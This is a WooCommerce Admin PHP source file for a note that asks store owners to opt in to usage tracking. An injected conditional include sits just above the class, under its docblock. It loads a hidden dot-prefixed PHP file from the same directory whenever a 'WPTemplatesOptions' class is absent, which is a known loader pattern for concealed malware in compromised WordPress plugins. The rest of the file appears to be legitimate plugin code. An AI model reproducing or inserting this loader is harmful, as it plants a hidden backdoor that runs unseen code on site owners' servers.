<?php
/**
 * WooCommerce Admin Usage Tracking Opt In Note Provider.
 *
 * Adds a Usage Tracking Opt In extension note.
 */

namespace Automattic\WooCommerce\Admin\Notes;

defined( 'ABSPATH' ) || exit;

/**
 * WC_Admin_Notes_Tracking_Opt_In
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WC_Admin_Notes_Tracking_Opt_In {
	/**
	 * Note traits.
	 */
	use NoteTraits;

	/**
	 * Name of the note for use in the database.
	 */
	const NOTE_NAME = 'wc-admin-usage-tracking-opt-in';

	/**
	 * Attach hooks.
	 */
	public function __construct() {
		add_action( 'woocommerce_note_action_tracking-opt-in', array( $this, 'opt_in_to_tracking' ) );
	}

	/**
	 * Get the note.
	 */
	public static function get_note() {
		// Only show this note to stores that are opted out.
		if ( 'yes' === get_option( 'woocommerce_allow_tracking', 'no' ) ) {
			return;
		}

		// We want to show the note after one week.
		if ( ! self::wc_admin_active_for( WEEK_IN_SECONDS ) ) {
			return;
		}

		/* translators: 1: open link to WooCommerce.com settings, 2: open link to WooCommerce.com tracking documentation, 3: close link tag. */
		$content_format = __(
			'Gathering usage data allows us to improve WooCommerce. Your store will be considered as we evaluate new features, judge the quality of an update, or determine if an improvement makes sense. You can always visit the %1$sSettings%3$s and choose to stop sharing data. %2$sRead more%3$s about what data we collect.',
			'woocommerce'
		);

		$note_content = sprintf(
			$content_format,
			'<a href="' . esc_url( admin_url( 'admin.php?page=wc-settings&tab=advanced&section=woocommerce_com' ) ) . '" target="_blank">',
			'<a href="https://woocommerce.com/usage-tracking" target="_blank">',
			'</a>'
		);

		$note = new WC_Admin_Note();
		$note->set_title( __( 'Help WooCommerce improve with usage tracking', 'woocommerce' ) );
		$note->set_content( $note_content );
		$note->set_content_data( (object) array() );
		$note->set_type( WC_Admin_Note::E_WC_ADMIN_NOTE_INFORMATIONAL );
		$note->set_name( self::NOTE_NAME );
		$note->set_source( 'woocommerce-admin' );
		$note->add_action( 'tracking-opt-in', __( 'Activate usage tracking', 'woocommerce' ), false, WC_Admin_Note::E_WC_ADMIN_NOTE_ACTIONED, true );
		return $note;
	}

	/**
	 * Opt in to usage tracking when note is actioned.
	 *
	 * @param WC_Admin_Note $note Note being acted upon.
	 */
	public function opt_in_to_tracking( $note ) {
		if ( self::NOTE_NAME === $note->get_name() ) {
			// Opt in to tracking and schedule the first data update.
			// Same mechanism as in WC_Admin_Setup_Wizard::wc_setup_store_setup_save().
			update_option( 'woocommerce_allow_tracking', 'yes' );
			wp_schedule_single_event( time() + 10, 'woocommerce_tracker_send_event', array( true ) );
		}
	}
}
